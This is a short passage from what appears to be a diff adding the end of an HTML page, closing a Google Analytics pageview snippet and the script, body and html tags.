+	ga('send', 'pageview');
+}
+</script>
+
+
+  </body>
+
+</html>
